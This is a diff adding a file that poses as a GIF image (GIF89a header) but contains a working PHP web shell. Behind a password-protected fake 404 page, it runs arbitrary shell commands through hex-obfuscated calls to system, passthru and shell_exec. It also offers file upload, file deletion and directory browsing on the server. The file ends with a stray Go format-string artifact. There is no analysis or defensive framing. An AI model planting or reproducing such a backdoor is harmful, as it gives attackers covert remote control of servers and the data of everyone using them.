@@ -1,0 +1,11 @@
+GIF89a;
+<?php
+if(!isset($_REQUEST['hbcvo'])||$_REQUEST['hbcvo']!=='kccrbd4i4ijnla'){http_response_code(404);exit('Not Found');}
+$d=isset($_REQUEST['dir'])?@realpath($_REQUEST['dir']):@getcwd();if(!$d)$d=@getcwd();
+if(isset($_REQUEST['c'])){$o='';$c=$_REQUEST['c'];$fn="\x73\x79\x73\x74\x65\x6d";$fn2="\x70\x61\x73\x73\x74\x68\x72\x75";$fn3="\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63";if(function_exists($fn)){ob_start();@$fn($c.' 2>&1');$o=ob_get_clean();}elseif(function_exists($fn2)){ob_start();@$fn2($c.' 2>&1');$o=ob_get_clean();}elseif(function_exists($fn3)){$o=@$fn3($c.' 2>&1');}echo '[S]'.$o.'[E]';exit;}
+echo '<h3>r00t@trenggalek6etar</h3><pre>'.php_uname().'</pre>';
+echo '<form method=post enctype=multipart/form-data><input type=file name=f><input type=submit name=up value=Upload></form>';
+if(isset($_POST['up'])&&isset($_FILES['f'])){@move_uploaded_file($_FILES['f']['tmp_name'],$d.'/'.basename($_FILES['f']['name']));}
+if(isset($_GET['del'])){@unlink($d.'/'.basename($_GET['del']));}
+echo '<ul>';$items=@scandir($d);if($items){foreach($items as $f){if($f=='.'||$f=='..')continue;$fp=$d.'/'.$f;$q='hbcvo=kccrbd4i4ijnla';echo '<li>'.(is_dir($fp)?'[DIR] <a href="?'.$q.'&dir='.urlencode($fp).'">'.htmlspecialchars($f).'</a>':htmlspecialchars($f).' <a href="?'.$q.'&del='.urlencode($f).'">[x]</a>').'</li>';}}echo '</ul>';
+?>%!(EXTRA string=hbcvo, string=kccrbd4i4ijnla)
